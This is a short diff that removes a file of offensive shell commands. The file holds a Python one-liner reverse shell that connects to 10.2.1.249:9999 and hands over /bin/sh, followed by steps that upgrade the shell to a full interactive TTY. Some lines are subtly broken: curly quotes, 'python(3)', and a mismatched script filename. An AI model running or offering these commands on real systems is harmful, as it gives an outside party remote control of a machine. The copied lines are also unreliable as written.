@@ -1,8 +1,0 @@
-python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.1.249",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-
-python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
-export TERM=xterm
-ctrl-z, stty raw -echo; fg
-
-echo "import pty; pty.spawn('/bin/bash')" > /tmp/anyname.py
-python(3) /tmp/filename.py
